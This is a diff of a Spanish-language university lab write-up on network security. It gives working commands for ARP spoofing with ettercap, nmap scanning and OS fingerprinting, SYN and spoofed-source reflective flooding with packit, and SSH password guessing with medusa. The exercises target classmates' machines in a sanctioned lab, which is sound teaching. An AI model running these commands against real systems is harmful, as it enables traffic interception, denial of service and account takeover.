@@ -108,7 +108,53 @@ nmap -sP 10.11.48.0/23
 
 ##### d) Obtenga la relación de las direcciones IPv6 de su segmento. 
 
+Para ehacerlo por direct link ejecutamos:
+
+```shell
+ping6 -I ens33 -c 3 ff02::1
+```
+
+y obtenemos la tabla de relaciones con:
+
+```shell
+ip -6 neigh
+```
+
+Otra opción es usando ThcIPv6:
+
+```shell
+apt install thc-ipv6
+```
+
+Y usamos alive6:
+
+```shell
+atk6-alive6 ens33
+```
+
 ##### e) Obtenga el tráfico de entrada y salida legítimo de su interface de red ens33 e investigue los servicios, conexiones y protocolos involucrados. 
+
+Para capturar el tráfico legítimo de nuestra máquina usaremos el comando tcpdump:
+
+```shell
+apt install tcpdump
+```
+
+Y almacenamos paquetería en un archivo:
+
+```shell
+tcpdump -w mitrafico.pcap
+```
+
+Tras terminas en nuestra máquina recibimos una copia del archivo con:
+
+```shell
+scp lsi@ip:/home/lsi/Escritorio/mitrafico.pcap C:/Directiorio/Destino
+```
+
+Y lo analizamos con la herramienta Wireshark.
+
+Para emplear esta herramienta debemos instalar (preferiblemente) la última versión del programa (en nuestro caso mediante el instalador para Windows), y una vez
 
 ##### f) Mediante arpspoofing entre una máquina objetivo (víctima) y el router del laboratorio obtenga todas las URL HTTP visitadas por la víctima. 
 
@@ -118,9 +164,13 @@ Ejecutamos ettercap:
 ettercap -i ens33 -Tq -P remote_browser -w /home/lsi/Escritorio/archivo.cap -M arp:remote /ip compañero// /ip router//
 ```
 
-mientras el compañero navega con el navegador lynx y emplea el comando curl.
+mientras el compañero navega con el navegador lynx y emplea los comandos curl y wget:
 
-Tras terminas el ataque en nuestra máquina recibimos una copia del archivo con:
+```shell
+ wget http://www.squid-cache.org/Images/img4.jpg
+```
+
+Tras terminar el ataque en nuestra máquina recibimos una copia del archivo con:
 
 ```shell
 scp lsi@ip:/home/lsi/Escritorio/archivo.cap C:/Directiorio/Destino
@@ -134,9 +184,89 @@ Y lo analizamos con la herramienta Wireshark.
 
 ##### i) Pruebe alguna herramienta y técnica de detección del sniffing (preferiblemente arpon). 
 
+Instalamos arpon:
+
+```shell
+apt install arpon
+```
+
+e incluímos en el fichero /etc/arpon.conf las IPs del router, del compañero y la nuestra junto con sus respectivas direcciones MAC.
+
+Para activar arpon se ejecuta:
+
+```shell
+systemctl start arpon@ens33 #no uses enable
+```
+
+y para detenerlo:
+
+```shell
+systemctl stop arpon@ens33
+```
+
 ##### j) Pruebe distintas técnicas de host discovery, port scanning y OS fingerprinting sobre las máquinas del laboratorio de prácticas en IPv4. Realice alguna de las pruebas de port scanning sobre IPv6. ¿Coinciden los servicios prestados por un sistema con los de IPv4?. 
 
+Para escaneo de puertos usaremos nmap:
+
+```shell
+nmap -sS -p 1-100 IPcompañero
+```
+
+o:
+
+```shell
+nmap -sU -p 1-100 IPcompañero
+```
+
+para escanear los puertos del 1 al 100 de la máquina de nuestro compañero, y:
+
+```shell
+nmap -sL 193.144.51.0/24
+```
+
+para conocer los nombres de dominio de todas las direcciones de la red mediante resolución inversa (DNS) **No lo hagais con otras redes, esta es propia de la udc para este tipo de cosas. PROBAR ESTO CON OTRAS REDES PUEDE TENER CONSECUENCIAS**.
+
+También puedes ejecutar:
+
+```shell
+nmap -sV IPcompañero
+```
+
+para hacer además fingerprinting a todos los puertos de la máquina.
+
+Por otra parte podemos usar :
+
+```shell
+nmap -O IPcompañero
+```
+
+Para hacer OS fingerprinting, y podemos añadir:
+
+```shell
+--osscan-guess
+```
+
+para forzar al programa a mostrar una estimación si no se puede determinar claramente con la información de la que dispone.
+
+Finalmente, podemos realizar escaneos con IPv6 con el comando:
+
+```shell
+nmap -6 -p 22, 80 -n IPv6%ens33
+```
+
 ##### k) Obtenga información “en tiempo real” sobre las conexiones de su máquina, así como del ancho de banda consumido en cada una de ellas. 
+
+Para la monitorización de red podemos usar los siguientes comandos:
+
+```shell
+iftop -i ens33
+```
+
+```shell
+vnstat -l -i ens33 #recomendado
+```
+
+De esta forma obtienes las tasas de emisión y recepción en bytes/s y paquetes/s. El ancho de banda consumido total es la suma de rx y tx totales.
 
 ##### l) Monitorizamos nuestra infraestructura: 
 1. Instale prometheus y node_exporter y configúrelos para recopilar todo tipo de métricas de su máquina linux. 
@@ -145,6 +275,10 @@ Y lo analizamos con la herramienta Wireshark.
 4. En los ataques de los apartados m y n busque posibles alteraciones en las métricas visualizadas. 
 
 ##### m) PARA PLANTEAR DE FORMA TEÓRICA.: ¿Cómo podría hacer un DoS de tipo direct attack contra un equipo de la red de prácticas? ¿Y mediante un DoS de tipo reflective flooding attack?. 
+
+Un ataque DoS directo consiste en realizar un gran número de conexiones a la máquina víctima (servidor o máquina normal) con la intención de sobrepasar la capacidad de la misma para atenderlas.
+
+Un DoS reflective consiste en mandar muchas paquetes de conexión modificados a un servidor para que la dirección de origen de los paquetes sea la máquina víctima, con la intención de que se desborde con las respuestas del servidor.
 
 ##### n) Ataque un servidor apache instalado en algunas de las máquinas del laboratorio de prácticas para tratar de provocarle una DoS. Utilice herramientas DoS que trabajen a nivel de aplicación (capa 7). ¿Cómo podría proteger dicho servicio ante este tipo de ataque? ¿Y si se produjese desde fuera de su segmento de red? ¿Cómo podría tratar de saltarse dicha protección? 
 
@@ -203,6 +337,17 @@ para Flood directo, o:
 packit -c 0 -b 0 -s IPorigen -dR -FS -S 22 -D 80
 ```
 
+para un ataque reflective
+
+**-c 0 -b 0** -> No hay límite del número de paquetes ni del burst
+
+**-s Iporigen -d Ipdestino** -> direcciones de origen y destino, respetcívamente
+
+**-FS** -> Se usan paquetes con el flag SYN activado
+
+**-S 1000 -D 22** -> puertos de origen y destino, respectivamente
+
+**-dR** -> Reflects (mandan las respuestas al origen)
 ##### o) Instale y configure modsecurity. Vuelva a proceder con el ataque del apartado anterior. ¿Qué acontece ahora? 
 
 ##### p) Buscamos información: 
@@ -211,10 +356,41 @@ packit -c 0 -b 0 -s IPorigen -dR -FS -S 22 -D 80
 3. ¿Puede hacer una transferencia de zona sobre los servidores DNS de la UDC?. En caso negativo, obtenga todos los nombres.dominio posibles de la UDC. 
 4. ¿Qué gestor de contenidos se utiliza en www.usc.es? 
 
+
+
 ##### q) Trate de sacar un perfil de los principales sistemas que conviven en su red de prácticas, puertos accesibles, fingerprinting, etc. 
 
 ##### r) Realice algún ataque de “password guessing” contra su servidor ssh y compruebe que el analizador de logs reporta las correspondientes alarmas. 
 
+Vamos a usar medusa para realizar password guessing:
+
+```shell
+apt install medusa
+```
+
+El comando que vamos a usar tiene el siguiente formato:
+
+```shell
+medusa -h IPcompi -u lsi -P dic.txt -M ssh -f
+```
+
+**-h IPcompi** -> dirección del host víctima
+
+**-u lsi** -> usuario del host
+
+**-P dic.txt** -> diccionario a usar
+
+**-M ssh** -> protocolo de conexión a emplear
+
+**-f** -> indica que termine el ataque al encontrar una combinación correcta
+
 ##### s) Reportar alarmas está muy bien, pero no estaría mejor un sistema activo, en lugar de uno pasivo. Configure algún sistema activo, por ejemplo OSSEC, y pruebe su funcionamiento ante un “password guessing”. 
 
 ##### t) Supongamos que una máquina ha sido comprometida y disponemos de un fichero con sus mensajes de log. Procese dicho fichero con OSSEC para tratar de localizar evidencias de lo acontecido (“post mortem”). Muestre las alertas detectadas con su grado de criticidad, así como un resumen de las mismas.
+
+
+##### Por hacer
+
+**Metasploit, modsecurity, ossec, grafana**
+
+**perfilar con nmap firewall, ip del compañero y servidor DHCP**
